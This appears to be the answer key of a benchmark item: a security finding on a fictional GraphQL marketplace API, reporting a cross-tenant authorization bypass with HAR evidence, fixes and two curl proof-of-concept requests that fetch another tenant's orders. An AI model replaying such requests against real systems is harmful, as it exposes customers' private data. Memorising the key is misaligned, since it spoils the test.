# Expected Response

## System
- Domain: E-Commerce / Marketplace
- System: ShopGrid Marketplace API
- Example ID: GQL-0103

## Priority Findings

### Finding 1: Authorization-Bypass Injection — Cross-Tenant Order Data Access via Injected tenantId (Pattern 5.1)
**Severity:** Critical
**Category:** Injection / Authorization-Bypass

**Summary:**
Per §5.0 (Pattern 5.1 — authorization-bypass injection): The `listOrders` resolver interpolates the client-supplied `tenantId` argument into authorization logic, enabling bypass. An attacker from `tenant-ed5f` passed `tenantId: "tenant-a32d"` to enumerate marketplace orders belonging to another merchant. The HAR response confirms `getOrder` resolver returned cross-tenant order data. In an e-commerce marketplace, this exposes customer PII, payment references, order history, and pricing strategies.

**Evidence from HAR:**
- Request: `POST https://api.shopgrid-marketpla.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-ed5f`
- Query: `listOrders(tenantId: "tenant-a32d") { orderId ownerId data { sensitiveField } }`
- Response `200 OK`; `getOrder`: `tenantId: "tenant-a32d"`, `ownerId: "other-user-ed5fa32d"`, `sensitiveField: "CONFIDENTIAL-ed5fa32d"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-ed5fa32d`
- Note: Domain objects are `Order`/`orderId` — resolver is `getOrder`/`listOrders`.

## Steps to Reproduce

### Step 1 — Authorization-bypass via injected tenantId (HAR)
```bash
curl -s -X POST https://api.shopgrid-marketpla.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-ed5f" \
  -d '{"query": "query VulnerableOp { listOrders(tenantId: \"tenant-a32d\") { orderId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-ed5fa32d` marketplace orders from `tenant-a32d`. **Secure:** FORBIDDEN.

### Step 2 — Direct order ID injection
```bash
curl -s -X POST https://api.shopgrid-marketpla.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-ed5f" \
  -d '{"query": "query { getOrder(id: \"O-2103\") { orderId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Cross-tenant order data returned.

## Remediation
1. `listOrders` must extract tenantId from JWT — never use client-supplied argument.
2. Resolver tenant guard on `getOrder`: `WHERE order_id=$id AND tenant_id=$jwt.tenantId`.
3. Redis cache key: `order:{tenantId}:{orderId}`.
